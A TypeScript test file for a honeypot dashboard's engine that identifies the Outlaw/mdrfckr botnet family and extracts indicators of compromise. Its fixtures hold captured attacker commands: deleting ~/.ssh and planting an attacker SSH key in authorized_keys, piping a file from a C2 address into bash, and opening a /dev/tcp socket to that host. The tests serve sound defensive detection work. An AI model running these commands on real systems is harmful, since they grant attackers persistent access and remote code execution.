/**
 * Tests for the botnet-family / IoC engine.
 *
 * The dashboard has no test runner, so this uses node:test (built into Node).
 * Run from apps/dashboard:
 *   npx tsx --test lib/botnet-signatures.test.ts
 */
import { test } from "node:test"
import assert from "node:assert/strict"
import {
  detectBotnetFamily,
  extractIocs,
  extractIocsFromCommands,
  hasThreatIntel,
} from "./botnet-signatures.ts"
import type { HoneypotEvent } from "./api/types.ts"

// Real commands captured from the production dump (mdrfckr session).
const MDRFCKR_CMDS = [
  "cd ~; chattr -ia .ssh; lockr -ia .ssh",
  'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~',
]

const C2_CMDS = [
  "curl -fsSL http://197.255.229.88:1987/fav.ico 2 > /dev/null | bash",
  "bash -c exec 3 <> /dev/tcp/197.255.229.88/1987",
  "printf GET /fav.ico HTTP/1.0\\r\\nHost: 197.255.229.88\\r\\nConnection: close\\r\\n\\r\\n >& 3",
]

const RECON_CMDS = ["uname -a", "whoami", "cat /proc/cpuinfo | grep name | wc -l", "free -m"]

function ev(partial: Partial<HoneypotEvent>): HoneypotEvent {
  return {
    id: "x", sessionId: "s", eventType: "command.input", eventTs: "", srcIp: "1.1.1.1",
    message: null, command: null, username: null, password: null, success: null,
    rawJson: {}, normalizedJson: {}, createdAt: "", cowrieEventId: "", cowrieTs: "",
    ...partial,
  }
}

test("detectBotnetFamily recognizes Outlaw/mdrfckr", () => {
  const m = detectBotnetFamily(MDRFCKR_CMDS)
  assert.ok(m, "should match a family")
  assert.equal(m!.id, "outlaw")
  assert.ok(m!.matchedPatterns.length >= 2)
})

test("detectBotnetFamily returns null for benign recon", () => {
  assert.equal(detectBotnetFamily(RECON_CMDS), null)
})

test("detectBotnetFamily returns null for empty input", () => {
  assert.equal(detectBotnetFamily([]), null)
})

test("extractIocs finds C2 from curl, /dev/tcp and Host: header", () => {
  const iocs = extractIocs(C2_CMDS.map((c) => ev({ command: c })))
  const hosts = new Set(iocs.c2.map((c) => c.host))
  assert.ok(hosts.has("197.255.229.88"), "should extract the C2 host from all 3 forms")
  assert.ok(iocs.c2.some((c) => c.value.includes("1987")), "should capture the C2 port")
})

test("extractIocs captures planted SSH key with its mdrfckr tag", () => {
  const iocs = extractIocs(MDRFCKR_CMDS.map((c) => ev({ command: c })))
  assert.equal(iocs.sshKeys.length, 1)
  assert.equal(iocs.sshKeys[0].algorithm, "ssh-rsa")
  assert.equal(iocs.sshKeys[0].comment, "mdrfckr")
})

test("extractIocs reads the SHA-256 from a file.download event", () => {
  const sha = "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"
  const iocs = extractIocs([
    ev({
      eventType: "file.download",
      message: `Saved redir contents with SHA-256 ${sha} to var/lib/cowrie/downloads/${sha}`,
    }),
  ])
  assert.deepEqual(iocs.malwareHashes, [sha])
})

test("extractIocsFromCommands works on plain command strings (no events)", () => {
  const iocs = extractIocsFromCommands([...MDRFCKR_CMDS, ...C2_CMDS])
  assert.ok(iocs.c2.some((c) => c.host === "197.255.229.88"))
  assert.equal(iocs.sshKeys.length, 1)
  assert.equal(iocs.sshKeys[0].comment, "mdrfckr")
})

test("hasThreatIntel is false for a plain recon session", () => {
  const family = detectBotnetFamily(RECON_CMDS)
  const iocs = extractIocs(RECON_CMDS.map((c) => ev({ command: c })))
  assert.equal(hasThreatIntel(family, iocs), false)
})
